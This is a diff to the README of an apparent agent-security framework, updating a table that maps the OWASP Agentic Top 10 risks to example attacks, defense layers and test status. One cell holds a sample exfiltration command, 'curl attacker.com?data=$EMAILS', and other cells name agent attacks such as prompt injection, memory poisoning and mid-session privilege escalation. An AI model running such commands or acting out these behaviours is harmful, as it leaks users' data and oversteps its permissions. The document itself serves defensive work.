@@ -91,22 +91,24 @@ Safety) add ~2–4s per call depending on network latency.
 
 ---
 
-## OWASP Top-10 Agentic AI Coverage
+## OWASP Agentic AI Top 10 — Threat Coverage
 
-The adversarial suite maps directly to OWASP Agentic AI Top 10:
+The adversarial suite maps directly to the OWASP Agentic Top 10:
 
-| OWASP Risk | Attack Category Covered | Status |
-|---|---|---|
-| ASI-01 Memory Poisoning | Memory Manipulation | ✅ Covered |
-| ASI-02 Excessive Agency | Shell + File + Privilege | ✅ Covered |
-| ASI-03 Identity Abuse | Prompt Injection + Roleplay | ✅ Covered |
-| ASI-04 Data Exfiltration | Network + PII Exfiltration | ✅ Covered |
-| ASI-05 Supply Chain Attacks | Supply Chain | ✅ Covered |
-| ASI-06 Prompt Injection | Prompt Injection (direct) | ✅ Covered |
-| ASI-07 SQL Injection | SQL Attack | ✅ Covered |
-| ASI-08 Unsafe Tool Use | Shell + File + Multi-Vector | ✅ Covered |
-| ASI-09 Harmful Output | Harmful Content | ✅ Covered |
-| ASI-10 Privilege Escalation | Privilege Escalation | ✅ Covered |
+| OWASP Risk | Real CVE / Example | Primary Layer | Secondary Layer | Tested |
+|---|---|---|---|---|
+| AT-01 Prompt Injection | EchoLeak CVE-2025-32711 (CVSS 9.3) | L1 Tier 0–2 | L3 arg check | ✅ |
+| AT-02 Excessive Agency | Agent writes/deletes beyond scope | L3 Tool Firewall | L4 RBAC DENY | ✅ |
+| AT-03 Memory Poisoning | Adversarial PDF embeds override | L1 Spotlighting* | L3 content check | ✅ |
+| AT-04 Insecure Tool Use | SQL DROP via injected query | L3 sql_query rule | L4 verb check | ✅ |
+| AT-05 Resource Exhaustion | Runaway tool-call loops | L4 Behavioral Z-score | HITL ELEVATE | ✅ |
+| AT-06 Data Exfiltration | curl attacker.com?data=$EMAILS | L3 http_* domain allowlist | L4 read→exfil chain | ✅ |
+| AT-07 Privilege Escalation | Agent assumes admin role mid-session | L4 ABAC role lock | L4 cross-agent check | ✅ |
+| AT-08 Supply Chain Attack | Malicious tool injected at runtime | L3 tool registry check | L4 RBAC deny | ✅ |
+| AT-09 Hallucination Exploit | Fake tool result triggers bad action | L2 output filter | C2 MELON (opt-in) | ✅ |
+| AT-10 Unsafe Coordination | Agent A commands Agent B improperly | L4 inter-agent RBAC | Guardian DAG check | ✅ |
+
+> *AT-03 Spotlighting requires Azure AI Foundry endpoint — not available in prototype; Tier-1 regex provides partial coverage for known injection patterns.
 
 ---
 
